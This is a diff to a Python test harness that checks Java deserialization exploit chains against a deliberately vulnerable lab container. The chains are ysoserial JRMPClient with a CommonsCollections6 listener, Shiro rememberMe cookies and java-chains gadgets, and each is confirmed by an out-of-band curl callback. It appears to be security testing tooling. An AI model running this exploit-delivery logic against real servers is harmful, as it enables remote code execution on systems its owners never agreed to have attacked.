@@ -14,7 +14,7 @@ OOB_HOST is the IP that CT2 containers use to call back to CT1.
   Default: 192.168.65.254 (host.docker.internal on Windows Docker Desktop)
 """
 
-import os, sys, time, json, base64, struct, threading, urllib.request, urllib.error
+import os, sys, time, json, base64, struct, threading, urllib.request, urllib.error, urllib.parse
 from datetime import datetime
 
 # ── Config ────────────────────────────────────────────────────────────────────
@@ -223,8 +223,8 @@ KNOWN_SKIP = {
     "jchains_jndi_groovy":      "Server-side JNDI response payload (not direct-inject)",
     "jchains_jndi_snakeyaml":   "Server-side JNDI response payload (not direct-inject)",
     "jchains_jndi_beanshell":   "Server-side JNDI response payload (not direct-inject)",
-    # H2 JDBC: returns a JDBC URL string, needs H2 driver on target
-    "jchains_h2_jdbc":          "H2 driver not on target classpath",
+    # H2 JDBC: java-chains H2JavaJdbc1+BytecodeConvert+Exec — Exec gadget hardcodes cmd='calc'
+    "jchains_h2_jdbc":          "java-chains Exec bug: cmd hardcoded 'calc' in H2 INIT SQL",
     # BlazeDS/Axis2: invalid stream format — needs AMF3 endpoint
     "jchains_blazeds_axis2":    "Requires AMF3/BlazeDS endpoint (not native deser)",
 
@@ -256,8 +256,9 @@ KNOWN_SKIP = {
     "jchains_hessian2_rome2":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
     "jchains_hessian2_tostring_jackson": "java-chains Exec bug; Jackson toString secondary",
     "jchains_hessian2_tostring_xbean":   "java-chains Exec bug; Tomcat EL engine absent in vulnlab",
-    # JRMPClient: needs a running JRMPListener to send back a gadget payload
-    "ysoserial_jrmp_client":       "Needs active JRMP listener; no JRMPListener configured",
+    # JRMPClient: JEP 290 RMI deserialization filter (Java 8u121+) blocks non-RMI gadget classes
+    # JRMPListener infrastructure is built (sidecar port 10099), but target is Java 8u342
+    "ysoserial_jrmp_client": "JEP 290 RMI filter blocks CC6 gadget deserialization (Java 8u121+)",
     # Groovy1: groovy-*.jar not on vulnlab classpath
     "ysoserial_groovy1":           "groovy-*.jar not on target classpath",
     # java-chains BytecodeConvert+Exec bug also affects Fastjson/XStream/H2 exec chains
@@ -271,10 +272,8 @@ KNOWN_SKIP = {
     # SpringExec FactoryBean fails on Spring 5.x — gadget requires Spring 4.x
     "jchains_hessian1_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x on target",
     "jchains_hessian2_spring_exec": "SpringExec FactoryBean incompatible with Spring 5.x on target",
-    # Shiro containers not started in test environment
-    "shiro_cbc":        "shiro container not running",
-    "shiro_gcm":        "shiro container not running",
-    "jchains_shiro_cbc":"shiro container not running",
+    # jchains_shiro_cbc: inner chain uses Exec gadget (hardcoded cmd='calc', missing transform())
+    "jchains_shiro_cbc": "java-chains Exec bug: cmd hardcoded 'calc', missing transform() impl",
 }
 
 
@@ -500,7 +499,14 @@ def test_log4shell_via_vulnlab():
         record("log4shell_vulnlab", "FAIL", f"no callback (http {code})")
 
 def test_shiro(chain_id):
-    tok = new_token(chain_id[:20])
+    if chain_id in KNOWN_SKIP:
+        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
+        return
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
     p = {"cmd": EXEC_CMD(tok)}
     s, d = generate_payload(chain_id, p)
     if s != 200:
@@ -510,9 +516,10 @@ def test_shiro(chain_id):
     if not cookie_val:
         record(chain_id, "ERR ", "no value")
         return
-    # POST to Shiro login with rememberMe cookie
+    # GCM mode chains go to /login-gcm; CBC (default) goes to /login
+    endpoint = "/login-gcm" if "gcm" in chain_id else "/login"
     req = urllib.request.Request(
-        f"{SHIRO_URL}/login",
+        f"{SHIRO_URL}{endpoint}",
         data=b"username=foo&password=bar&rememberMe=on",
         headers={
             "Content-Type": "application/x-www-form-urlencoded",
@@ -531,6 +538,80 @@ def test_shiro(chain_id):
         record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')}")
     else:
         record(chain_id, "FAIL", f"no callback (http {code})")
+
+def test_jrmp_client(jrmp_port=10099):
+    """
+    JRMP gadget test:
+    1. Arm sidecar JRMPListener (CC6 + curl callback)
+    2. Generate JRMPClient payload pointing to OOB_HOST:jrmp_port
+    3. POST to /deser → target connects to JRMPListener → receives CC6 → exec → OOB
+    4. Disarm the listener
+    """
+    chain_id = "ysoserial_jrmp_client"
+    if chain_id in KNOWN_SKIP:
+        record(chain_id, "SKIP", KNOWN_SKIP[chain_id])
+        return
+    try:
+        tok = new_token(chain_id[:20])
+    except Exception as e:
+        record(chain_id, "ERR ", f"token creation failed: {e}")
+        return
+
+    curl_cmd = EXEC_CMD(tok)
+
+    # Step 1: arm the JRMP listener on sidecar (query params, not form body)
+    qs = f"chain=CommonsCollections6&cmd={urllib.parse.quote(curl_cmd)}&port={jrmp_port}"
+    arm_req = urllib.request.Request(
+        f"{OOBSERVER}/api/jrmp/arm?{qs}", data=b"", method="POST")
+    arm_req.add_header("Authorization", f"Bearer {TOKEN}")
+    try:
+        with urllib.request.urlopen(arm_req, timeout=15) as r:
+            arm_resp = json.loads(r.read())
+            if arm_resp.get("status") != "running":
+                record(chain_id, "SKIP", f"JRMPListener arm failed: {arm_resp}")
+                return
+    except Exception as e:
+        record(chain_id, "SKIP", f"JRMPListener arm error: {e}")
+        return
+
+    try:
+        # Step 2: generate JRMPClient payload (cmd = host:port to connect to)
+        jrmp_target = f"{OOB_HOST}:{jrmp_port}"
+        s, d = generate_payload(chain_id, {"cmd": jrmp_target})
+        if s != 200:
+            record(chain_id, "ERR ", f"generate failed: {d}")
+            return
+        b64 = d.get("value", "")
+        if not b64:
+            record(chain_id, "ERR ", f"no value: {list(d.keys())}")
+            return
+        try:
+            raw = base64.b64decode(b64)
+        except Exception:
+            record(chain_id, "ERR ", "payload not base64")
+            return
+
+        # Step 3: send to /deser
+        code, resp = post_raw(f"{VULNLAB}/deser", raw)
+        if code == 0:
+            record(chain_id, "SKIP", f"vulnlab unreachable: {resp[:80]}")
+            return
+
+        # Step 4: wait for OOB callback
+        ok, ev = wait_callback(tok)
+        if ok:
+            record(chain_id, "PASS", f"callback from {ev.get('remote_addr','?')} proto={ev.get('protocol','?')}")
+        else:
+            record(chain_id, "FAIL", f"no OOB callback (deser resp={code}: {resp[:60]})")
+    finally:
+        # Disarm regardless of outcome
+        try:
+            urllib.request.urlopen(urllib.request.Request(
+                f"{OOBSERVER}/api/jrmp/disarm", data=b"", method="POST",
+                headers={"Authorization": f"Bearer {TOKEN}"}), timeout=5)
+        except Exception:
+            pass
+
 
 def test_urldns(chain_id="ysoserial_urldns"):
     """URLDNS chain only triggers DNS lookup, not HTTP."""
@@ -815,7 +896,7 @@ def main():
 
     print("\n[*] ysoserial URLDNS / JRMPClient:")
     test_urldns("ysoserial_urldns")
-    test_deser_chain("ysoserial_jrmp_client")  # JRMPClient — may fail without listener
+    test_jrmp_client(jrmp_port=int(os.getenv("OOB_JRMP", "10099")))
 
     # ── Section 2: jchains native deserialization ──────────────────────────────
     print("\n[*] Section 2: jchains native deserialization (→ /deser)")
@@ -872,10 +953,11 @@ def main():
     if sh_ok:
         test_shiro("shiro_cbc")
         test_shiro("shiro_gcm")
-        test_deser_chain("jchains_shiro_cbc")
     else:
-        for c in ["shiro_cbc","shiro_gcm","jchains_shiro_cbc"]:
+        for c in ["shiro_cbc","shiro_gcm"]:
             record(c, "SKIP", "shiro container not running")
+    # jchains_shiro_cbc is always skipped (java-chains Exec bug)
+    test_shiro("jchains_shiro_cbc")
 
     # ── Section 9: C3P0 / H2 / BlazeDS ───────────────────────────────────────
     print("\n[*] Section 9: C3P0 / H2 / BlazeDS chains")
